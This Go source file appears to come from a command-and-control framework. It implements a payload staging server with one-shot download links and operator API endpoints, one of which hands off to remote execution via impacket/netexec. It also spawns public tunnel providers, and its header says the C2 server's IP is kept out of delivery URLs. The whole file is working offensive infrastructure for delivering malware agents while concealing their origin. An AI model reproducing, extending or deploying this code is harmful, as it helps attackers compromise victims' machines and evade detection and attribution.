package server

// stager.go — local file staging server + tunnel manager.
//
// Architecture:
//   Operator uploads files → stager HTTP server on 127.0.0.1:PORT
//   Tunnel provider (cloudflared/ngrok/serveo) exposes a random public URL
//   Files served at: <pubURL>/<random_token>/<filename>
//   C2 server IP never appears in the delivery URL.

import (
	"bufio"
	"compress/gzip"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"mime"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"time"
)

// ── Types ─────────────────────────────────────────────────────────────────────

type StagedFile struct {
	Token     string    `json:"token"`
	Name      string    `json:"name"`
	Size      int64     `json:"size"`
	MIME      string    `json:"mime"`
	OneShot   bool      `json:"one_shot"`
	Downloads int       `json:"downloads"`
	AddedAt   time.Time `json:"added_at"`
	URL       string    `json:"url,omitempty"`
}

type tunnelProc struct {
	provider string
	cmd      *exec.Cmd
	url      string
}

type stagingServer struct {
	mu     sync.Mutex
	files  map[string]*StagedFile // token → file
	dir    string
	port   int
	srv    *http.Server
	tunnel *tunnelProc
	pubURL string
}

var stg = &stagingServer{files: make(map[string]*StagedFile)}

// ── Start / Stop ──────────────────────────────────────────────────────────────

func (ss *stagingServer) start(dir string, port int) error {
	ss.mu.Lock()
	defer ss.mu.Unlock()
	if ss.srv != nil {
		return fmt.Errorf("stager already running on :%d", ss.port)
	}
	os.MkdirAll(dir, 0700)
	ss.dir = dir
	ss.port = port
	mux := http.NewServeMux()
	mux.HandleFunc("/", ss.serveFile)
	ss.srv = &http.Server{
		Addr:        fmt.Sprintf(":%d", port),
		Handler:     mux,
		ReadTimeout: 15 * time.Second,
	}
	go func() {
		if err := ss.srv.ListenAndServe(); err != http.ErrServerClosed {
			ss.mu.Lock()
			ss.srv = nil
			ss.mu.Unlock()
		}
	}()
	return nil
}

func (ss *stagingServer) stop() {
	ss.mu.Lock()
	defer ss.mu.Unlock()
	if ss.srv != nil {
		ss.srv.Close()
		ss.srv = nil
	}
}

// ── File management ───────────────────────────────────────────────────────────

func randToken() string {
	b := make([]byte, 16)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func (ss *stagingServer) add(name string, data []byte, oneShot bool) (*StagedFile, error) {
	ss.mu.Lock()
	defer ss.mu.Unlock()
	if ss.dir == "" {
		ss.dir = "data/stager"
		os.MkdirAll(ss.dir, 0700)
	}
	token := randToken()
	diskName := token + "_" + sanitizeName(name)
	path := filepath.Join(ss.dir, diskName)
	if err := os.WriteFile(path, data, 0600); err != nil {
		return nil, err
	}
	mt := mime.TypeByExtension(filepath.Ext(name))
	if mt == "" {
		mt = "application/octet-stream"
	}
	sf := &StagedFile{
		Token:   token,
		Name:    name,
		Size:    int64(len(data)),
		MIME:    mt,
		OneShot: oneShot,
		AddedAt: time.Now(),
	}
	if ss.pubURL != "" {
		sf.URL = ss.pubURL + "/" + token + "/" + name
	}
	ss.files[token] = sf
	return sf, nil
}

func (ss *stagingServer) remove(token string) {
	ss.mu.Lock()
	sf, ok := ss.files[token]
	if ok {
		delete(ss.files, token)
	}
	dir := ss.dir
	ss.mu.Unlock()
	if ok {
		os.Remove(filepath.Join(dir, token+"_"+sanitizeName(sf.Name)))
	}
}

func (ss *stagingServer) list() []StagedFile {
	ss.mu.Lock()
	defer ss.mu.Unlock()
	out := make([]StagedFile, 0, len(ss.files))
	for _, f := range ss.files {
		fc := *f
		if ss.pubURL != "" {
			fc.URL = ss.pubURL + "/" + f.Token + "/" + f.Name
		}
		out = append(out, fc)
	}
	return out
}

func (ss *stagingServer) serveFile(w http.ResponseWriter, r *http.Request) {
	// Path: /<token>/<filename>  or  /<token>
	parts := strings.SplitN(strings.TrimPrefix(r.URL.Path, "/"), "/", 2)
	if len(parts) == 0 || parts[0] == "" {
		http.NotFound(w, r)
		return
	}
	token := parts[0]

	ss.mu.Lock()
	sf, ok := ss.files[token]
	if !ok {
		ss.mu.Unlock()
		http.NotFound(w, r)
		return
	}
	sf.Downloads++
	if sf.OneShot {
		delete(ss.files, token)
	}
	path := filepath.Join(ss.dir, token+"_"+sanitizeName(sf.Name))
	fname := sf.Name
	mt := sf.MIME
	oneShot := sf.OneShot
	ss.mu.Unlock()

	if oneShot {
		defer os.Remove(path)
	}
	w.Header().Set("Content-Type", mt)
	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, fname))
	w.Header().Set("Cache-Control", "no-store, no-cache")
	w.Header().Set("X-Content-Type-Options", "nosniff")
	http.ServeFile(w, r, path)
}

// ── Tunnel management ─────────────────────────────────────────────────────────

// Supported providers and their public URL patterns.
var tunnelProviders = map[string]struct {
	buildCmd func(port int) *exec.Cmd
	re       *regexp.Regexp
}{
	"cloudflared": {
		buildCmd: func(port int) *exec.Cmd {
			bin := resolveCloudflared()
			return exec.Command(bin, "tunnel",
				"--url", fmt.Sprintf("http://127.0.0.1:%d", port),
				"--no-autoupdate")
		},
		re: regexp.MustCompile(`https://[a-zA-Z0-9-]+\.trycloudflare\.com`),
	},
	"ngrok": {
		buildCmd: func(port int) *exec.Cmd {
			return exec.Command("ngrok", "http", fmt.Sprintf("%d", port),
				"--log", "stdout", "--log-format", "term")
		},
		re: regexp.MustCompile(`https://[a-zA-Z0-9-]+\.ngrok[-a-z0-9.]*\.(app|io|dev)`),
	},
	"serveo": {
		buildCmd: func(port int) *exec.Cmd {
			return exec.Command("ssh",
				"-o", "StrictHostKeyChecking=no",
				"-o", "ServerAliveInterval=30",
				"-o", "ExitOnForwardFailure=yes",
				"-T",
				"-R", fmt.Sprintf("80:127.0.0.1:%d", port),
				"serveo.net")
		},
		// Serveo now uses serveousercontent.com (updated from serveo.net)
		re: regexp.MustCompile(`https://[a-zA-Z0-9._-]+\.serveo(?:usercontent\.com|\.net)`),
	},
	"bore": {
		buildCmd: func(port int) *exec.Cmd {
			return exec.Command("bore", "local", fmt.Sprintf("%d", port), "--to", "bore.pub")
		},
		re: regexp.MustCompile(`bore\.pub:\d+`),
	},
	"localtunnel": {
		buildCmd: func(port int) *exec.Cmd {
			return exec.Command("npx", "--yes", "localtunnel", "--port", fmt.Sprintf("%d", port))
		},
		re: regexp.MustCompile(`https://[a-zA-Z0-9-]+\.loca\.lt`),
	},
}

func (ss *stagingServer) startTunnel(provider string) (string, error) {
	ss.mu.Lock()
	if ss.tunnel != nil {
		url := ss.tunnel.url
		ss.mu.Unlock()
		return url, fmt.Errorf("tunnel already running (%s): %s", ss.tunnel.provider, url)
	}
	port := ss.port
	if port == 0 {
		ss.mu.Unlock()
		return "", fmt.Errorf("start the staging server first")
	}
	ss.mu.Unlock()

	p, ok := tunnelProviders[provider]
	if !ok {
		keys := make([]string, 0, len(tunnelProviders))
		for k := range tunnelProviders {
			keys = append(keys, k)
		}
		return "", fmt.Errorf("unknown provider %q — use: %s", provider, strings.Join(keys, ", "))
	}

	cmd := p.buildCmd(port)
	stdout, _ := cmd.StdoutPipe()
	stderr, _ := cmd.StderrPipe()

	if err := cmd.Start(); err != nil {
		return "", fmt.Errorf("%s: %w (is it installed?)", provider, err)
	}

	urlCh := make(chan string, 1)
	scanFor := func(r io.Reader) {
		sc := bufio.NewScanner(r)
		for sc.Scan() {
			if m := p.re.FindString(sc.Text()); m != "" {
				select {
				case urlCh <- m:
				default:
				}
			}
		}
	}
	go scanFor(stdout)
	go scanFor(stderr)

	var pubURL string
	select {
	case pubURL = <-urlCh:
	case <-time.After(45 * time.Second):
		cmd.Process.Kill()
		return "", fmt.Errorf("timeout waiting for %s URL (45s)", provider)
	}

	ss.mu.Lock()
	ss.tunnel = &tunnelProc{provider: provider, cmd: cmd, url: pubURL}
	ss.pubURL = pubURL
	for _, f := range ss.files {
		f.URL = pubURL + "/" + f.Token + "/" + f.Name
	}
	ss.mu.Unlock()

	// Clean up when the process exits
	go func() {
		cmd.Wait()
		ss.mu.Lock()
		if ss.tunnel != nil && ss.tunnel.cmd == cmd {
			ss.tunnel = nil
			ss.pubURL = ""
		}
		ss.mu.Unlock()
	}()

	return pubURL, nil
}

func (ss *stagingServer) stopTunnel() {
	ss.mu.Lock()
	tp := ss.tunnel
	ss.tunnel = nil
	ss.pubURL = ""
	ss.mu.Unlock()
	if tp != nil && tp.provider != "manual" && tp.cmd != nil && tp.cmd.Process != nil {
		tp.cmd.Process.Kill()
	}
}

func (ss *stagingServer) status() map[string]any {
	ss.mu.Lock()
	defer ss.mu.Unlock()
	prov := ""
	if ss.tunnel != nil {
		prov = ss.tunnel.provider
	}
	return map[string]any{
		"running":         ss.srv != nil,
		"port":            ss.port,
		"tunnel_active":   ss.tunnel != nil,
		"tunnel_provider": prov,
		"public_url":      ss.pubURL,
		"file_count":      len(ss.files),
	}
}

// ── Operator API handlers ─────────────────────────────────────────────────────

func (s *Server) apiStager(w http.ResponseWriter, r *http.Request) {
	sub := strings.TrimPrefix(r.URL.Path, "/api/stager")
	sub = strings.TrimPrefix(sub, "/")

	switch {

	// GET /api/stager  → status
	case sub == "" && r.Method == http.MethodGet:
		jsonOK(w, stg.status())

	// POST /api/stager/start  → start server
	case sub == "start" && r.Method == http.MethodPost:
		var req struct {
			Port int    `json:"port"`
			Dir  string `json:"dir"`
		}
		req.Port = 7777
		req.Dir = filepath.Join(s.cfg.DataDir, "stager")
		json.NewDecoder(r.Body).Decode(&req)
		if err := stg.start(req.Dir, req.Port); err != nil {
			jsonErr(w, err.Error(), http.StatusConflict)
			return
		}
		jsonOK(w, map[string]any{"port": req.Port, "dir": req.Dir})

	// POST /api/stager/stop  → stop server
	case sub == "stop" && r.Method == http.MethodPost:
		stg.stop()
		jsonOK(w, map[string]string{"status": "stopped"})

	// GET /api/stager/files  → list
	case sub == "files" && r.Method == http.MethodGet:
		jsonOK(w, stg.list())

	// POST /api/stager/files  → upload (multipart: file + one_shot)
	case sub == "files" && r.Method == http.MethodPost:
		r.ParseMultipartForm(64 << 20) // 64 MB
		fh, hdr, err := r.FormFile("file")
		if err != nil {
			jsonErr(w, "file field required", http.StatusBadRequest)
			return
		}
		defer fh.Close()
		data, err := io.ReadAll(io.LimitReader(fh, 64<<20))
		if err != nil {
			jsonErr(w, "read: "+err.Error(), http.StatusBadRequest)
			return
		}
		oneShot := r.FormValue("one_shot") == "true" || r.FormValue("one_shot") == "1"
		sf, err := stg.add(hdr.Filename, data, oneShot)
		if err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		BroadcastGUI("LOG", "", fmt.Sprintf("stager: added %s (%d bytes, one_shot=%v)", sf.Name, sf.Size, sf.OneShot))
		jsonOK(w, sf)

	// DELETE /api/stager/files/<token>  → remove
	case strings.HasPrefix(sub, "files/") && r.Method == http.MethodDelete:
		token := strings.TrimPrefix(sub, "files/")
		stg.remove(token)
		jsonOK(w, map[string]string{"status": "removed"})

	// POST /api/stager/files/local  → stage a server-local file path (e.g. bin/agent.exe)
	case sub == "files/local" && r.Method == http.MethodPost:
		var req struct {
			Path    string `json:"path"`
			OneShot bool   `json:"one_shot"`
		}
		if err := jsonBody(r, &req); err != nil || req.Path == "" {
			jsonErr(w, "path required", http.StatusBadRequest)
			return
		}
		// Prevent path traversal
		clean := filepath.Clean(req.Path)
		if strings.Contains(clean, "..") {
			jsonErr(w, "invalid path", http.StatusBadRequest)
			return
		}
		data, err := os.ReadFile(clean)
		if err != nil {
			jsonErr(w, "read file: "+err.Error(), http.StatusBadRequest)
			return
		}
		sf, err := stg.add(filepath.Base(clean), data, req.OneShot)
		if err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		BroadcastGUI("LOG", "", fmt.Sprintf("stager: staged local file %s (%d bytes)", sf.Name, sf.Size))
		jsonOK(w, sf)

	// POST /api/stager/tunnel/start  → start tunnel (or set manual URL)
	case sub == "tunnel/start" && r.Method == http.MethodPost:
		var req struct {
			Provider string `json:"provider"`
			URL      string `json:"url"`  // only for provider=="manual"
			Port     int    `json:"port"` // override port to tunnel (0 = use stager port)
		}
		req.Provider = "cloudflared"
		json.NewDecoder(r.Body).Decode(&req)

		if req.Provider == "manual" {
			if req.URL == "" {
				jsonErr(w, "url required for manual provider", http.StatusBadRequest)
				return
			}
			pubURL := strings.TrimRight(req.URL, "/")
			stg.mu.Lock()
			stg.tunnel = &tunnelProc{provider: "manual", url: pubURL}
			stg.pubURL = pubURL
			for _, f := range stg.files {
				f.URL = pubURL + "/" + f.Token + "/" + f.Name
			}
			stg.mu.Unlock()
			BroadcastGUI("LOG", "", "stager manual URL set: "+pubURL)
			jsonOK(w, map[string]string{"url": pubURL, "provider": "manual"})
			return
		}

		// If a specific port is requested (e.g. 8080 for payload staging via handleStage),
		// start a one-shot tunnel to that port without touching the stager server.
		if req.Port > 0 {
			p, ok := tunnelProviders[req.Provider]
			if !ok {
				jsonErr(w, "unknown provider: "+req.Provider, http.StatusBadRequest)
				return
			}
			cmd := p.buildCmd(req.Port)
			stdout, _ := cmd.StdoutPipe()
			stderr, _ := cmd.StderrPipe()
			if err := cmd.Start(); err != nil {
				jsonErr(w, req.Provider+": "+err.Error(), http.StatusInternalServerError)
				return
			}
			urlCh := make(chan string, 1)
			scan := func(r io.Reader) {
				sc := bufio.NewScanner(r)
				for sc.Scan() {
					if m := p.re.FindString(sc.Text()); m != "" {
						select { case urlCh <- m: default: }
					}
				}
			}
			go scan(stdout)
			go scan(stderr)
			var pubURL string
			select {
			case pubURL = <-urlCh:
			case <-time.After(45 * time.Second):
				cmd.Process.Kill()
				jsonErr(w, "timeout waiting for tunnel URL (45s)", http.StatusInternalServerError)
				return
			}
			go cmd.Wait()
			BroadcastGUI("LOG", "", "payload tunnel started: "+pubURL)
			jsonOK(w, map[string]string{"url": pubURL, "provider": req.Provider})
			return
		}

		// Auto-start stager server if not already running
		if stg.port == 0 {
			dir := filepath.Join(s.cfg.DataDir, "stager")
			if err := stg.start(dir, 7777); err != nil && !strings.Contains(err.Error(), "already running") {
				jsonErr(w, "auto-start stager: "+err.Error(), http.StatusInternalServerError)
				return
			}
		}

		pubURL, err := stg.startTunnel(req.Provider)
		if err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		BroadcastGUI("LOG", "", "stager tunnel started: "+pubURL)
		jsonOK(w, map[string]string{"url": pubURL, "provider": req.Provider})

	// POST /api/stager/tunnel/stop  → stop tunnel
	case sub == "tunnel/stop" && r.Method == http.MethodPost:
		stg.stopTunnel()
		BroadcastGUI("LOG", "", "stager tunnel stopped")
		jsonOK(w, map[string]string{"status": "stopped"})

	// POST /api/stager/run  → run upload/exec via impacket/netexec
	case sub == "run" && r.Method == http.MethodPost:
		s.apiStagerRun(w, r)

	default:
		jsonErr(w, "not found", http.StatusNotFound)
	}
}

// ── Helpers ───────────────────────────────────────────────────────────────────

func sanitizeName(name string) string {
	// Allow only safe filename chars
	var b strings.Builder
	for _, c := range filepath.Base(name) {
		if c == '/' || c == '\\' || c == ':' || c == '*' || c == '?' || c == '"' || c == '<' || c == '>' || c == '|' {
			b.WriteRune('_')
		} else {
			b.WriteRune(c)
		}
	}
	s := b.String()
	if s == "" {
		s = "file"
	}
	return s
}

// resolveCloudflared returns the path to cloudflared, downloading it if necessary.
// It caches the binary in the OS temp dir so subsequent calls are instant.
func resolveCloudflared() string {
	// 1. Already in PATH?
	if p, err := exec.LookPath("cloudflared"); err == nil {
		return p
	}
	// 2. Cached in temp dir?
	cache := filepath.Join(os.TempDir(), "cloudflared_c2")
	if _, err := os.Stat(cache); err == nil {
		return cache
	}
	// 3. Download from GitHub releases
	arch := runtime.GOARCH
	if arch == "amd64" {
		arch = "amd64"
	}
	goos := runtime.GOOS
	urlMap := map[string]string{
		"linux/amd64":  "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64",
		"linux/arm64":  "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64",
		"darwin/amd64": "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz",
		"darwin/arm64": "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz",
	}
	dlURL, ok := urlMap[goos+"/"+arch]
	if !ok {
		return "cloudflared" // fallback — will fail at exec with clear error
	}

	resp, err := http.Get(dlURL) //nolint:gosec
	if err != nil {
		return "cloudflared"
	}
	defer resp.Body.Close()

	var r io.Reader = resp.Body
	if strings.HasSuffix(dlURL, ".tgz") {
		gz, err := gzip.NewReader(resp.Body)
		if err != nil {
			return "cloudflared"
		}
		defer gz.Close()
		r = gz
	}

	f, err := os.OpenFile(cache, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0755)
	if err != nil {
		return "cloudflared"
	}
	defer f.Close()
	io.Copy(f, r) //nolint:errcheck
	return cache
}
